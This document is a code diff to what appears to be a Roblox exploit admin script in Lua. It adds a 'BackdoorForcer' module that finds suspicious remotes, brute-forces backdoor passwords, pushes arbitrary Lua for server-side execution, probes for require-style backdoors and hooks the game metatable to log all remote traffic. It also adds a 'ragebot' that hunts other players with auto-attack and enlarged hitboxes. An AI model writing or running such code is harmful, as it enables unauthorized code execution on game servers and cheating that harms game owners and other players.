+            if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
+                scanned = scanned + 1
+                local suspicious, reason = isSuspiciousName(desc.Name)
+                local parentSuspicious = false
+                local parent = desc.Parent
+                if parent then
+                    local pClass = parent.ClassName
+                    if pClass == "Part" or pClass == "MeshPart"
+                    or pClass == "UnionOperation" or pClass == "SpecialMesh"
+                    or pClass == "Model" then
+                        parentSuspicious = true
+                        reason = (reason or "") .. " | hidden in " .. pClass
+                    end
+                end
+                if suspicious or parentSuspicious then
+                    table.insert(self.State.SuspiciousRemotes, {
+                        Remote = desc,
+                        Name = desc.Name,
+                        Path = desc:GetFullName(),
+                        Type = desc.ClassName,
+                        Reason = reason or "suspicious parent",
+                        Parent = parent and parent.ClassName or "?",
+                    })
+                    found = found + 1
+                end
+            end
+        end
+    end
+    for _, svcName in ipairs(services) do
+        local ok, svc = pcall(game.GetService, game, svcName)
+        if ok and svc then
+            scanContainer(svc)
+        end
+    end
+    print(string.format("\n=== BACKDOOR SCAN RESULTS ==="))
+    print(string.format("Scanned %d remotes, found %d suspicious", scanned, found))
+    for i, data in ipairs(self.State.SuspiciousRemotes) do
+        print(string.format("[%d] [%s] %s\n     Path: %s\n     Reason: %s | Parent: %s",
+            i, data.Type, data.Name, data.Path, data.Reason, data.Parent))
+    end
+    DoNotif(string.format("Found %d suspicious remotes (check console)", found),
+        found > 0 and 2 or 1)
+    return found
+end
+function Modules.BackdoorForcer:List()
+    if #self.State.SuspiciousRemotes == 0 then
+        DoNotif("No suspicious remotes cached. Run ;scanback first.", 3)
+        return
+    end
+    print("\n=== SUSPICIOUS / BACKDOOR REMOTES ===")
+    for i, data in ipairs(self.State.SuspiciousRemotes) do
+        print(string.format("[%d] [%s] %s\n     %s\n     Reason: %s",
+            i, data.Type, data.Name, data.Path, data.Reason))
+    end
+    DoNotif(string.format("Listed %d suspicious remotes (check console)",
+        #self.State.SuspiciousRemotes), 2)
+end
+function Modules.BackdoorForcer:TryPasswords(customCode)
+    if #self.State.SuspiciousRemotes == 0 then
+        DoNotif("No suspicious remotes. Run ;scanback first.", 3)
+        return
+    end
+    local code = customCode or [[print("BACKDOOR_ACTIVE:" .. tostring(game.JobId))]]
+    local attempts = 0
+    local hits = 0
+    DoNotif("Trying backdoor passwords...", 2)
+    print("\n=== TRYING BACKDOOR PASSWORDS ===")
+    for _, data in ipairs(self.State.SuspiciousRemotes) do
+        for _, pw in ipairs(self.Config.CommonPasswords) do
+            local argSets = {
+                {pw, code},
+                {pw},
+                {code, pw},
+                {{key = pw, code = code}},
+                {{password = pw, script = code}},
+                {{pass = pw, exec = code}},
+                {pw, LocalPlayer.Name, code},
+                {pw, LocalPlayer},
+                {LocalPlayer, pw, code},
+                {tostring(LocalPlayer.UserId), code},
+                {LocalPlayer.UserId, code},
+            }
+            for _, argSet in ipairs(argSets) do
+                local ok, result = pcall(function()
+                    if data.Type == "RemoteFunction" then
+                        return data.Remote:InvokeServer(unpack(argSet))
+                    else
+                        data.Remote:FireServer(unpack(argSet))
+                        return nil
+                    end
+                end)
+                attempts = attempts + 1
+                if ok then hits = hits + 1 end
+                task.wait(0.02)
+            end
+        end
+    end
+    DoNotif(string.format("Password attempts: %d/%d clean. Check console for BACKDOOR_ACTIVE.",
+        hits, attempts), 2)
+end
+function Modules.BackdoorForcer:TryExec(luaCode)
+    if #self.State.SuspiciousRemotes == 0 then
+        DoNotif("No suspicious remotes. Run ;scanback first.", 3)
+        return
+    end
+    local code = luaCode or [[print("exec_test:" .. game.JobId)]]
+    local attempts = 0
+    DoNotif("Trying loadstring exec on suspicious remotes...", 2)
+    local passwordPrefixes = {"", table.unpack(self.Config.CommonPasswords)}
+    for _, data in ipairs(self.State.SuspiciousRemotes) do
+        local rawArgSets = {
+            {code},
+            {{code = code}},
+            {{script = code}},
+            {{exec = code}},
+            {{lua = code}},
+            {{source = code}},
+        }
+        for _, argSet in ipairs(rawArgSets) do
+            pcall(function()
+                if data.Type == "RemoteFunction" then
+                    data.Remote:InvokeServer(unpack(argSet))
+                else
+                    data.Remote:FireServer(unpack(argSet))
+                end
+            end)
+            attempts = attempts + 1
+            task.wait(0.02)
+        end
+        for _, pw in ipairs(self.Config.CommonPasswords) do
+            pcall(function()
+                if data.Type == "RemoteFunction" then
+                    data.Remote:InvokeServer(pw, code)
+                else
+                    data.Remote:FireServer(pw, code)
+                end
+            end)
+            attempts = attempts + 1
+            task.wait(0.02)
+        end
+    end
+    DoNotif(string.format("Exec attempts: %d. Watch console for output.", attempts), 2)
+end
+function Modules.BackdoorForcer:TryRequire()
+    if #self.State.SuspiciousRemotes == 0 then
+        DoNotif("No suspicious remotes. Run ;scanback first.", 3)
+        return
+    end
+    local testIds = {
+        1234567890,
+        0,
+        1,
+        "require",
+        "load",
+    }
+    local attempts = 0
+    DoNotif("Probing for require-style backdoors...", 2)
+    for _, data in ipairs(self.State.SuspiciousRemotes) do
+        for _, id in ipairs(testIds) do
+            local argSets = {
+                {id},
+                {"require", id},
+                {{assetId = id}},
+                {{id = id}},
+                {{moduleId = id}},
+            }
+            for _, argSet in ipairs(argSets) do
+                local ok, result = pcall(function()
+                    if data.Type == "RemoteFunction" then
+                        return data.Remote:InvokeServer(unpack(argSet))
+                    else
+                        data.Remote:FireServer(unpack(argSet))
+                    end
+                end)
+                attempts = attempts + 1
+                if ok and result ~= nil then
+                    print(string.format("[RequireProbe] %s returned: %s",
+                        data.Path, tostring(result)))
+                end
+                task.wait(0.02)
+            end
+        end
+    end
+    DoNotif(string.format("Require probe done: %d attempts. Check console.", attempts), 2)
+end
+function Modules.BackdoorForcer:StartSpy()
+    if self.State.SpyHook then
+        DoNotif("Backdoor spy already running.", 3)
+        return
+    end
+    self.State.SpyLog = {}
+    local mt = getrawmetatable(game)
+    local oldNamecall = mt.__namecall
+    setreadonly(mt, false)
+    self.State.SpyHook = newcclosure(function(self_obj, ...)
+        local method = getnamecallmethod()
+        if (method == "FireServer" or method == "InvokeServer") then
+            if self_obj:IsA("RemoteEvent") or self_obj:IsA("RemoteFunction") then
+                local args = {...}
+                local entry = string.format("[BackdoorSpy] %s:%s(%s)",
+                    self_obj:GetFullName(), method, prettyArgs(args))
+                print(entry)
+                table.insert(Modules.BackdoorForcer.State.SpyLog, entry)
+            end
+        end
+        return oldNamecall(self_obj, ...)
+    end)
+    mt.__namecall = self.State.SpyHook
+    setreadonly(mt, true)
+    DoNotif("Full backdoor spy started. ALL remote traffic will be logged.", 2)
+end
+function Modules.BackdoorForcer:StopSpy()
+    if not self.State.SpyHook then
+        DoNotif("Backdoor spy not running.", 3)
+        return
+    end
+    local mt = getrawmetatable(game)
+    setreadonly(mt, false)
+    self.State.SpyHook = nil
+    setreadonly(mt, true)
+    DoNotif(string.format("Backdoor spy stopped. %d events logged. Check console.",
+        #self.State.SpyLog), 2)
+end
+function Modules.BackdoorForcer:PrintSpyLog()
+    if #self.State.SpyLog == 0 then
+        DoNotif("Spy log is empty.", 3)
+        return
+    end
+    print("\n=== BACKDOOR SPY LOG ===")
+    for i, entry in ipairs(self.State.SpyLog) do
+        print(string.format("[%d] %s", i, entry))
+    end
+    print(string.format("Total: %d events", #self.State.SpyLog))
+    DoNotif(string.format("Printed %d spy log entries.", #self.State.SpyLog), 2)
+end
+RegisterCommand({
+    Name = "scanback",
+    Aliases = {"sb"},
+    Description = "Scan for suspicious/backdoor remotes in common services"
+}, function()
+    Modules.BackdoorForcer:Scan(false)
+end)
+RegisterCommand({
+    Name = "deepback",
+    Aliases = {"dsb"},
+    Description = "Deep scan ALL services for backdoor remotes (slower, more thorough)"
+}, function()
+    DoNotif("Deep scanning all services...", 2)
+    Modules.BackdoorForcer:Scan(true)
+end)
+RegisterCommand({
+    Name = "listback",
+    Aliases = {"lb"},
+    Description = "List all suspicious remotes found (check console)"
+}, function()
+    Modules.BackdoorForcer:List()
+end)
+RegisterCommand({
+    Name = "tryback",
+    Aliases = {"tb"},
+    Description = "Try common backdoor passwords on suspicious remotes"
+}, function()
+    Modules.BackdoorForcer:TryPasswords()
+end)
+RegisterCommand({
+    Name = "tryexec",
+    Aliases = {"exec"},
+    Description = "Try to execute Lua code via loadstring backdoors. Usage: ;tryexec <lua code>"
+}, function(args)
+    local code = args[1] and table.concat(args, " ") or nil
+    Modules.BackdoorForcer:TryExec(code)
+end)
+RegisterCommand({
+    Name = "tryrequire",
+    Aliases = {"treq"},
+    Description = "Probe for require()-style backdoors"
+}, function()
+    Modules.BackdoorForcer:TryRequire()
+end)
+RegisterCommand({
+    Name = "backspy",
+    Aliases = {"bspy"},
+    Description = "Log ALL remote traffic to console (noisy but thorough)"
+}, function()
+    Modules.BackdoorForcer:StartSpy()
+end)
+RegisterCommand({
+    Name = "stopbackspy",
+    Aliases = {"sbspy"},
+    Description = "Stop backdoor spy"
+}, function()
+    Modules.BackdoorForcer:StopSpy()
+end)
+RegisterCommand({
+    Name = "backlog",
+    Aliases = {"blog"},
+    Description = "Print the full backdoor spy log to console"
+}, function()
+    Modules.BackdoorForcer:PrintSpyLog()
+end)
 Modules.RemoteForcer = {
     State = {
         Remotes = {},
@@ -32202,7 +33419,8 @@ Modules.RemoteForcer = {
             "EquipTool", "Equip", "EquipWeapon", "SelectWeapon", 
             "GiveTool", "GiveWeapon", "UnlockWeapon", "PurchaseWeapon",
             "ToolEquip", "LoadoutEquip", "SelectLoadout", "SwapWeapon",
-             "Shop", "Function"
+             "Shop", "Function", "Give", "Activate", "Use", "loadstring",
+             "hacker", "Invoke", "MeleeWeapon",
         },
         CommonWeaponServices = {
             "ReplicatedStorage", "ReplicatedFirst"
@@ -34128,13 +35346,11 @@ Modules.HeuristicRemoteBruteforcer = {
         IsScanning = false
     },
     Config = {
-        FIRE_DELAY = 0.25,
-        MAX_CALLS_PER_REMOTE = 15,
+        FIRE_DELAY = 1,
+        MAX_CALLS_PER_REMOTE = 5,
         BlacklistedParents = {
             game:GetService("CoreGui"),
-            game:GetService("StarterGui"),
-            game:GetService("ReplicatedFirst"),
-            game:GetService("Workspace")
+            game:GetService("RobloxReplicatedStorage")
         }
     },
     Services = {
@@ -38795,6 +40011,575 @@ RegisterCommand({
 }, function()
     Modules.PromptForensics:Expose()
 end)
+RegisterCommand({
+    Name        = "ragebot",
+    Aliases     = {"rage", "pfarm"},
+    Description = "Playerfarmer for the client",
+    ArgsDesc    = {},
+    Permissions = {},
+}, function(args, speaker)
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local Theme = {
+        Background = Color3.fromRGB(35, 35, 45),
+        Primary = Color3.fromRGB(25, 25, 35),
+        Accent = Color3.fromRGB(255, 80, 80),
+        Text = Color3.fromRGB(200, 220, 255),
+        TextSecondary = Color3.fromRGB(220, 180, 180),
+        Interactive = Color3.fromRGB(40, 40, 40),
+        Font = Enum.Font.Code,
+        CornerRadius = 8
+    }
+    local Settings = {
+        Enabled = false,
+        AutoAttack = false,
+        AutoCycle = false,
+        HoverDistance = 6,
+        AttackCPS = 10,
+        Target = nil,
+        LerpSpeed = 0.15,
+        BoxReachEnabled = false,
+        BoxReachSize = Vector3.new(15, 15, 15),
+        BoxReachSelectedPart = nil
+    }
+    local mainConnection, lastAttackTime = nil, 0
+    local equippedTool, playerList = nil, {}
+    local currentTargetIndex = 1
+    local reachSelectionBox = nil
+    local characterConnections = {}
+    local isMinimized = false
+    local originalMainWindowSize = UDim2.new(0, 600, 0, 280)
+    local ScreenGui = Instance.new("ScreenGui", PlayerGui)
+    ScreenGui.Name = "RageBotMenuGUI_Complete"
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    ScreenGui.ResetOnSpawn = false
+    local function makeUICorner(e, r)
+        local c = Instance.new("UICorner")
+        c.CornerRadius = UDim.new(0, r or Theme.CornerRadius)
+        c.Parent = e
+    end
+    local MainWindow = Instance.new("Frame", ScreenGui)
+    MainWindow.Name = "MainWindow"
+    MainWindow.Size = originalMainWindowSize
+    MainWindow.Position = UDim2.new(0.5, -300, 0.5, -140)
+    MainWindow.BackgroundColor3 = Theme.Background
+    MainWindow.Active = true
+    makeUICorner(MainWindow)
+    local TopBar = Instance.new("Frame", MainWindow)
+    TopBar.Name = "TopBar"
+    TopBar.Size = UDim2.new(1, 0, 0, 30)
+    TopBar.BackgroundColor3 = Theme.Primary
+    do
+        local c = Instance.new("UICorner", TopBar)
+        c.CornerRadius = UDim.new(0, Theme.CornerRadius)
+    end
+    local TitleLabel = Instance.new("TextLabel", TopBar)
+    TitleLabel.Name = "TitleLabel"
+    TitleLabel.Size = UDim2.new(1, -40, 1, 0)
+    TitleLabel.Position = UDim2.new(0, 10, 0, 0)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Font = Theme.Font
+    TitleLabel.Text = "Rage Bot (Complete)"
+    TitleLabel.TextColor3 = Theme.Text
+    TitleLabel.TextSize = 16
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    local MinimizeButton = Instance.new("TextButton", TopBar)
+    MinimizeButton.Name = "MinimizeButton"
+    MinimizeButton.Size = UDim2.new(0, 24, 0, 24)
+    MinimizeButton.Position = UDim2.new(1, -28, 0.5, -12)
+    MinimizeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
+    MinimizeButton.Font = Theme.Font
+    MinimizeButton.TextColor3 = Color3.new(1, 1, 1)
+    MinimizeButton.Text = "-"
+    MinimizeButton.TextSize = 14
+    makeUICorner(MinimizeButton, 6)
+    local ContentPage = Instance.new("Frame", MainWindow)
+    ContentPage.Name = "ContentPage"
+    ContentPage.Size = UDim2.new(1, 0, 1, -30)
+    ContentPage.Position = UDim2.new(0, 0, 0, 30)
+    ContentPage.BackgroundTransparency = 1
+    local LeftColumn = Instance.new("Frame", ContentPage)
+    LeftColumn.Name = "LeftColumn"
+    LeftColumn.Size = UDim2.new(0.5, -10, 1, -20)
+    LeftColumn.Position = UDim2.new(0, 10, 0, 10)
+    LeftColumn.BackgroundTransparency = 1
+    local LeftLayout = Instance.new("UIListLayout", LeftColumn)
+    LeftLayout.Padding = UDim.new(0, 10)
+    LeftLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    local RightColumn = Instance.new("Frame", ContentPage)
+    RightColumn.Name = "RightColumn"
+    RightColumn.Size = UDim2.new(0.5, -10, 1, -20)
+    RightColumn.Position = UDim2.new(0.5, 0, 0, 10)
+    RightColumn.BackgroundTransparency = 1
+    local RightLayout = Instance.new("UIListLayout", RightColumn)
+    RightLayout.Padding = UDim.new(0, 10)
+    RightLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    local playerSelectorContainer = Instance.new("Frame", LeftColumn)
+    playerSelectorContainer.Size = UDim2.new(1, 0, 0, 64)
+    playerSelectorContainer.BackgroundTransparency = 1
+    playerSelectorContainer.LayoutOrder = 1
+    local playerSelectorLabel = Instance.new("TextLabel", playerSelectorContainer)
+    playerSelectorLabel.Size = UDim2.new(1, 0, 0, 30)
+    playerSelectorLabel.BackgroundTransparency = 1
+    playerSelectorLabel.Text = "Target Player:"
+    playerSelectorLabel.TextColor3 = Theme.TextSecondary
+    playerSelectorLabel.Font = Theme.Font
+    playerSelectorLabel.TextSize = 15
+    playerSelectorLabel.TextXAlignment = Enum.TextXAlignment.Left
+    local playerDropdownButton = Instance.new("TextButton", playerSelectorContainer)
+    playerDropdownButton.Size = UDim2.new(0.6, -5, 0, 28)
+    playerDropdownButton.Position = UDim2.new(0, 0, 0, 30)
+    playerDropdownButton.BackgroundColor3 = Theme.Interactive
+    playerDropdownButton.TextColor3 = Theme.Text
+    playerDropdownButton.Font = Theme.Font
+    playerDropdownButton.TextSize = 15
+    playerDropdownButton.Text = "Select Player"
+    makeUICorner(playerDropdownButton, 6)
+    local cycleToggleButton = Instance.new("TextButton", playerSelectorContainer)
+    cycleToggleButton.Size = UDim2.new(0.4, 0, 0, 28)
+    cycleToggleButton.Position = UDim2.new(0.6, 5, 0, 30)
+    cycleToggleButton.BackgroundColor3 = Theme.Interactive
+    cycleToggleButton.TextColor3 = Theme.Text
+    cycleToggleButton.Font = Theme.Font
+    cycleToggleButton.TextSize = 16
+    makeUICorner(cycleToggleButton, 6)
+    local rageBotToggleContainer = Instance.new("Frame", LeftColumn)
+    rageBotToggleContainer.LayoutOrder = 2
+    local rageBotToggle = Instance.new("TextButton", rageBotToggleContainer)
+    local autoAttackToggleContainer = Instance.new("Frame", LeftColumn)
+    autoAttackToggleContainer.LayoutOrder = 3
+    local autoAttackToggle = Instance.new("TextButton", autoAttackToggleContainer)
+    local cpsInputContainer = Instance.new("Frame", LeftColumn)
+    cpsInputContainer.LayoutOrder = 4
+    local cpsInput = Instance.new("TextBox", cpsInputContainer)
+    local distanceInputContainer = Instance.new("Frame", LeftColumn)
+    distanceInputContainer.LayoutOrder = 5
+    local distanceInput = Instance.new("TextBox", distanceInputContainer)
+    local rightTitle = Instance.new("TextLabel", RightColumn)
+    rightTitle.Size = UDim2.new(1, 0, 0, 20)
+    rightTitle.BackgroundTransparency = 1
+    rightTitle.Font = Theme.Font
+    rightTitle.TextColor3 = Theme.Accent
+    rightTitle.TextSize = 18
+    rightTitle.Text = "BoxReach Module"
+    rightTitle.LayoutOrder = 0
+    local boxReachToggleContainer = Instance.new("Frame", RightColumn)
+    boxReachToggleContainer.LayoutOrder = 1
+    local boxReachToggle = Instance.new("TextButton", boxReachToggleContainer)
+    local sizeInputContainer = Instance.new("Frame", RightColumn)
+    sizeInputContainer.LayoutOrder = 2
+    local sizeInput = Instance.new("TextBox", sizeInputContainer)
+    local partsFrame = Instance.new("Frame", RightColumn)
+    partsFrame.LayoutOrder = 3
+    partsFrame.Size = UDim2.new(1, 0, 0, 120)
+    partsFrame.BackgroundTransparency = 1
+    local partsLabel = Instance.new("TextLabel", partsFrame)
+    partsLabel.Size = UDim2.new(1, 0, 0, 20)
+    partsLabel.BackgroundTransparency = 1
+    partsLabel.Font = Theme.Font
+    partsLabel.TextColor3 = Theme.TextSecondary
+    partsLabel.Text = "Tool Parts:"
+    local partsScroll = Instance.new("ScrollingFrame", partsFrame)
+    partsScroll.Size = UDim2.new(1, 0, 1, -20)
+    partsScroll.Position = UDim2.new(0, 0, 0, 20)
+    partsScroll.BackgroundColor3 = Theme.Primary
+    partsScroll.BorderSizePixel = 0
+    local partsLayout = Instance.new("UIListLayout", partsScroll)
+    partsLayout.Padding = UDim.new(0, 5)
+    function resetAllToolParts(tool)
+        if not tool then
+            return
+        end
+        for _, d in ipairs(tool:GetDescendants()) do
+            if d:IsA("BasePart") then
+                local o = d:FindFirstChild("OriginalSize")
+                if o then
+                    d.Size = o.Value
+                    o:Destroy()
+                end
+            end
+        end
+        if reachSelectionBox then
+            reachSelectionBox:Destroy()
+            reachSelectionBox = nil
+        end
+    end
+    function applyBoxReach()
+        if not Settings.BoxReachEnabled or not Settings.BoxReachSelectedPart or not Settings.BoxReachSelectedPart.Parent then
+            return
+        end
+        local p = Settings.BoxReachSelectedPart
+        if not p:FindFirstChild("OriginalSize") then
+            local v = Instance.new("Vector3Value", p)
+            v.Name = "OriginalSize"
+            v.Value = p.Size
+        end
+        p.Size = Settings.BoxReachSize
+        if reachSelectionBox then
+            reachSelectionBox:Destroy()
+        end
+        reachSelectionBox = Instance.new("SelectionBox")
+        reachSelectionBox.Adornee = p
+        reachSelectionBox.LineThickness = 0.02
+        reachSelectionBox.Color3 = Theme.Accent
+        reachSelectionBox.Parent = p
+    end
+    function handleMovement(mR, tR)
+        local bV = -tR.CFrame.LookVector
+        local tP = tR.Position + (bV * Settings.HoverDistance)
+        local nCF = CFrame.lookAt(tP, tR.Position)
+        mR.CFrame = mR.CFrame:Lerp(nCF, Settings.LerpSpeed)
+    end
+    function handleAutoAttack()
+        if not Settings.AutoAttack or not equippedTool then
+            return
+        end
+        local aI = 1 / Settings.AttackCPS
+        if os.clock() - lastAttackTime >= aI then
+            lastAttackTime = os.clock()
+            pcall(
+                function()
+                    equippedTool:Activate()
+                end
+            )
+        end
+    end
+    function startBot()
+        if mainConnection then
+            return
+        end
+        mainConnection =
+            RunService.RenderStepped:Connect(
+            function()
+                if not Settings.Enabled or not Settings.Target or not Settings.Target.Character then
+                    return
+                end
+                local mC, tC = LocalPlayer.Character, Settings.Target.Character
+                local mR, mH, tR =
+                    mC and mC:FindFirstChild("HumanoidRootPart"),
+                    mC and mC:FindFirstChildOfClass("Humanoid"),
+                    tC and tC:FindFirstChild("HumanoidRootPart")
+                if not (mR and mH and mH.Health > 0 and tR) then
+                    return
+                end
+                handleMovement(mR, tR)
+                handleAutoAttack()
+            end
+        )
+    end
+    function stopBot()
+        if mainConnection then
+            mainConnection:Disconnect()
+            mainConnection = nil
+        end
+    end
+    function populatePartList()
+        for _, c in ipairs(partsScroll:GetChildren()) do
+            if c:IsA("TextButton") then
+                c:Destroy()
+            end
+        end
+        Settings.BoxReachSelectedPart = nil
+        if not equippedTool then
+            return
+        end
+        local selectedButton = nil
+        for _, p in ipairs(equippedTool:GetDescendants()) do
+            if p:IsA("BasePart") then
+                local b = Instance.new("TextButton", partsScroll)
+                b.Size = UDim2.new(1, -10, 0, 25)
+                b.BackgroundColor3 = Theme.Interactive
+                b.TextColor3 = Theme.Text
+                b.Font = Theme.Font
+                b.Text = p.Name
+                b.MouseButton1Click:Connect(
+                    function()
+                        resetAllToolParts(equippedTool)
+                        Settings.BoxReachSelectedPart = p
+                        applyBoxReach()
+                        if selectedButton then
+                            selectedButton.BackgroundColor3 = Theme.Interactive
+                        end
+                        b.BackgroundColor3 = Theme.Accent
+                        selectedButton = b
+                    end
+                )
+            end
+        end
+    end
+    function cleanupConnections()
+        for i, v in ipairs(characterConnections) do
+            v:Disconnect()
+        end
+        characterConnections = {}
+    end
+    function trackEquippedTool(character)
+        cleanupConnections()
+        resetAllToolParts(equippedTool)
+        equippedTool = character:FindFirstChildOfClass("Tool")
+        populatePartList()
+        table.insert(
+            characterConnections,
+            character.ChildAdded:Connect(
+                function(c)
+                    if c:IsA("Tool") then
+                        resetAllToolParts(equippedTool)
+                        equippedTool = c
+                        populatePartList()
+                    end
+                end
+            )
+        )
+        table.insert(
+            characterConnections,
+            character.ChildRemoved:Connect(
+                function(c)
+                    if c == equippedTool then
+                        resetAllToolParts(equippedTool)
+                        equippedTool = nil
+                        populatePartList()
+                    end
+                end
+            )
+        )
+    end
+    function createToggle(button, container, text, default, cb)
+        container.Size = UDim2.new(1, 0, 0, 32)
+        container.BackgroundTransparency = 1
+        button.Size = UDim2.new(1, 0, 1, 0)
+        button.BackgroundColor3 = Theme.Interactive
+        button.TextColor3 = Theme.Text
+        button.Font = Theme.Font
+        button.TextSize = 16
+        makeUICorner(button, 6)
+        local s = default
+        button.Text = text .. ": " .. (s and "ON" or "OFF")
+        button.MouseButton1Click:Connect(
+            function()
+                s = not s
+                button.Text = text .. ": " .. (s and "ON" or "OFF")
+                if cb then
+                    cb(s)
+                end
+            end
+        )
+    end
+    function createInput(textBox, container, label, default, cb)
+        container.Size = UDim2.new(1, 0, 0, 32)
+        container.BackgroundTransparency = 1
+        local l = Instance.new("TextLabel", container)
+        l.Size = UDim2.new(0.45, 0, 1, 0)
+        l.BackgroundTransparency = 1
+        l.Text = label .. ":"
+        l.TextColor3 = Theme.TextSecondary
+        l.Font = Theme.Font
+        l.TextSize = 15
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        textBox.Size = UDim2.new(0.55, 0, 1, 0)
+        textBox.Position = UDim2.new(0.45, 0, 0, 0)
+        textBox.BackgroundColor3 = Theme.Interactive
+        textBox.TextColor3 = Theme.Text
+        textBox.Font = Theme.Font
+        textBox.TextSize = 15
+        textBox.Text = tostring(default)
+        makeUICorner(textBox, 6)
+        textBox.FocusLost:Connect(
+            function(e)
+                if e then
+                    textBox.Text = tostring(cb(textBox.Text))
+                else
+                    textBox.Text = tostring(cb(nil))
+                end
+            end
+        )
+    end
+    do
+        local iS = false
+        local dS, sP
+        TopBar.InputBegan:Connect(
+            function(i)
+                if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+                    iS = true
+                    dS = i.Position
+                    sP = MainWindow.Position
+                    i.Changed:Connect(
+                        function()
+                            if i.UserInputState == Enum.UserInputState.End then
+                                iS = false
+                            end
+                        end
+                    )
+                end
+            end
+        )
+        UserInputService.InputChanged:Connect(
+            function(i)
+                if
+                    (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) and
+                        iS
+                 then
+                    local d = i.Position - dS
+                    MainWindow.Position = UDim2.new(sP.X.Scale, sP.X.Offset + d.X, sP.Y.Scale, sP.Y.Offset + d.Y)
+                end
+            end
+        )
+    end
+    MinimizeButton.MouseButton1Click:Connect(
+        function()
+            isMinimized = not isMinimized
+            ContentPage.Visible = not isMinimized
+            if isMinimized then
+                MainWindow.Size = UDim2.new(0, 200, 0, 30)
+                MinimizeButton.Text = "+"
+            else
+                MainWindow.Size = originalMainWindowSize
+                MinimizeButton.Text = "-"
+            end
+        end
+    )
+    local cycleState = Settings.AutoCycle
+    cycleToggleButton.Text = "Cycle: " .. (cycleState and "ON" or "OFF")
+    cycleToggleButton.MouseButton1Click:Connect(
+        function()
+            cycleState = not cycleState
+            Settings.AutoCycle = cycleState
+            cycleToggleButton.Text = "Cycle: " .. (cycleState and "ON" or "OFF")
+        end
+    )
+    local function refreshPlayerList()
+        playerList = {}
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                table.insert(playerList, p)
+            end
+        end
+        if #playerList > 0 then
+            currentTargetIndex = math.clamp(currentTargetIndex, 1, #playerList)
+            Settings.Target = playerList[currentTargetIndex]
+            playerDropdownButton.Text = Settings.Target.Name
+        else
+            Settings.Target = nil
+            playerDropdownButton.Text = "No Players"
+        end
+    end
+    playerDropdownButton.MouseButton1Click:Connect(
+        function()
+            if #playerList == 0 then
+                return
+            end
+            currentTargetIndex = (currentTargetIndex % #playerList) + 1
+            Settings.Target = playerList[currentTargetIndex]
+            playerDropdownButton.Text = Settings.Target.Name
+        end
+    )
+    task.spawn(
+        function()
+            while true do
+                task.wait(3)
+                if Settings.AutoCycle and Settings.Enabled and #playerList > 1 then
+                    currentTargetIndex = (currentTargetIndex % #playerList) + 1
+                    Settings.Target = playerList[currentTargetIndex]
+                    playerDropdownButton.Text = Settings.Target.Name
+                end
+            end
+        end
+    )
+    refreshPlayerList()
+    Players.PlayerAdded:Connect(refreshPlayerList)
+    Players.PlayerRemoving:Connect(refreshPlayerList)
+    createToggle(
+        rageBotToggle,
+        rageBotToggleContainer,
+        "Rage Bot",
+        Settings.Enabled,
+        function(s)
+            Settings.Enabled = s
+            if s then
+                startBot()
+            else
+                stopBot()
+            end
+        end
+    )
+    createToggle(
+        autoAttackToggle,
+        autoAttackToggleContainer,
+        "Auto Attack",
+        Settings.AutoAttack,
+        function(s)
+            Settings.AutoAttack = s
+        end
+    )
+    createInput(
+        cpsInput,
+        cpsInputContainer,
+        "CPS",
+        Settings.AttackCPS,
+        function(v)
+            if v and tonumber(v) and tonumber(v) > 0 and tonumber(v) <= 30 then
+                Settings.AttackCPS = tonumber(v)
+            end
+            return Settings.AttackCPS
+        end
+    )
+    createInput(
+        distanceInput,
+        distanceInputContainer,
+        "Distance",
+        Settings.HoverDistance,
+        function(v)
+            if v and tonumber(v) and tonumber(v) >= 2 and tonumber(v) <= 20 then
+                Settings.HoverDistance = tonumber(v)
+            end
+            return Settings.HoverDistance
+        end
+    )
+    createToggle(
+        boxReachToggle,
+        boxReachToggleContainer,
+        "BoxReach",
+        Settings.BoxReachEnabled,
+        function(s)
+            Settings.BoxReachEnabled = s
+            if s then
+                applyBoxReach()
+            else
+                resetAllToolParts(equippedTool)
+            end
+        end
+    )
+    createInput(
+        sizeInput,
+        sizeInputContainer,
+        "Size",
+        "15,15,15",
+        function(t)
+            if t then
+                local n = {}
+                for m in string.gmatch(t, "[^,]+") do
+                    table.insert(n, tonumber(m))
+                end
+                if #n == 3 and n[1] and n[2] and n[3] then
+                    Settings.BoxReachSize = Vector3.new(n[1], n[2], n[3])
+                    applyBoxReach()
+                end
+            end
+            return string.format(
+                "%.1f,%.1f,%.1f",
+                Settings.BoxReachSize.X,
+                Settings.BoxReachSize.Y,
+                Settings.BoxReachSize.Z
+            )
+        end
+    )
+    if LocalPlayer.Character then
+        trackEquippedTool(LocalPlayer.Character)
+    end
+    LocalPlayer.CharacterAdded:Connect(trackEquippedTool)
+end)
 Modules.Aggressor = {
     State = {
         IsEnabled = false,
@@ -39812,84 +41597,6 @@ addcmd('disable',{},function(args, speaker)
 		end
 	end
 end)
-local invisGUIS = {}
-addcmd('showguis',{},function(args, speaker)
-	for i,v in pairs(PlayerGui:GetDescendants()) do
-		if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
-			v.Visible = true
-			if not FindInTable(invisGUIS,v) then
-				table.insert(invisGUIS,v)
-			end
-		end
-	end
-end)
-addcmd('unshowguis',{},function(args, speaker)
-	for i,v in pairs(invisGUIS) do
-		v.Visible = false
-	end
-	invisGUIS = {}
-end)
-local hiddenGUIS = {}
-addcmd('hideguis',{},function(args, speaker)
-	for i,v in pairs(PlayerGui:GetDescendants()) do
-		if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
-			v.Visible = false
-			if not FindInTable(hiddenGUIS,v) then
-				table.insert(hiddenGUIS,v)
-			end
-		end
-	end
-end)
-local Tools = {}
-addcmd("rightgrip", {"rgrip", "regr"}, function(args, speaker)
